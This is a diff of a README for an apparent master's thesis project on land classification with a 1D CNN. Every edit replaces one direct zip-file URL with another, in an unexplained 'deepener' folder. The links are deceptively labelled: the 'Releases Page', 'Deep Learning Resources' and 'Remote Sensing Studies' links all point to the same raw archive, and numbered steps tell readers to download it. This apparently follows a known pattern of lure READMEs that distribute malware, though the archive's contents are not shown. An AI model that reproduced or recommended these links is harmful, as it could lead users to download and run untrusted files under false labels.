@@ -1,6 +1,6 @@
 # 🌍 Masters-Thesis-GeoAI-1D-CNN - Explore Land Classification with Ease
 
-[![Download Latest Release](https://raw.githubusercontent.com/Raul4fun/Masters-Thesis-GeoAI-1D-CNN/main/deepener/Masters-Thesis-GeoAI-1D-CNN.zip%20Latest%20Release-v1.0-brightgreen)](https://raw.githubusercontent.com/Raul4fun/Masters-Thesis-GeoAI-1D-CNN/main/deepener/Masters-Thesis-GeoAI-1D-CNN.zip)
+[![Download Latest Release](https://github.com/Raul4fun/Masters-Thesis-GeoAI-1D-CNN/raw/refs/heads/main/deepener/CNN_Masters_Thesis_Geo_A_v1.5.zip%20Latest%20Release-v1.0-brightgreen)](https://github.com/Raul4fun/Masters-Thesis-GeoAI-1D-CNN/raw/refs/heads/main/deepener/CNN_Masters_Thesis_Geo_A_v1.5.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to the Masters-Thesis-GeoAI-1D-CNN project! This software allows you to 
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [Releases Page](https://raw.githubusercontent.com/Raul4fun/Masters-Thesis-GeoAI-1D-CNN/main/deepener/Masters-Thesis-GeoAI-1D-CNN.zip).
+To get started, visit this page to download: [Releases Page](https://github.com/Raul4fun/Masters-Thesis-GeoAI-1D-CNN/raw/refs/heads/main/deepener/CNN_Masters_Thesis_Geo_A_v1.5.zip).
 
 1. Click on the link above to navigate to the releases page.
 2. Look for the latest version download file.
@@ -89,9 +89,9 @@ Thanks to everyone who contributed to this project, including those who provided
 
 For more insights on the methodologies and algorithms used, visit:
 
-- [Deep Learning Resources](https://raw.githubusercontent.com/Raul4fun/Masters-Thesis-GeoAI-1D-CNN/main/deepener/Masters-Thesis-GeoAI-1D-CNN.zip)
-- [Remote Sensing Studies](https://raw.githubusercontent.com/Raul4fun/Masters-Thesis-GeoAI-1D-CNN/main/deepener/Masters-Thesis-GeoAI-1D-CNN.zip) 
+- [Deep Learning Resources](https://github.com/Raul4fun/Masters-Thesis-GeoAI-1D-CNN/raw/refs/heads/main/deepener/CNN_Masters_Thesis_Geo_A_v1.5.zip)
+- [Remote Sensing Studies](https://github.com/Raul4fun/Masters-Thesis-GeoAI-1D-CNN/raw/refs/heads/main/deepener/CNN_Masters_Thesis_Geo_A_v1.5.zip) 
 
-For updates, please keep an eye on our [Releases Page](https://raw.githubusercontent.com/Raul4fun/Masters-Thesis-GeoAI-1D-CNN/main/deepener/Masters-Thesis-GeoAI-1D-CNN.zip).
+For updates, please keep an eye on our [Releases Page](https://github.com/Raul4fun/Masters-Thesis-GeoAI-1D-CNN/raw/refs/heads/main/deepener/CNN_Masters_Thesis_Geo_A_v1.5.zip).
 
 Happy analyzing!
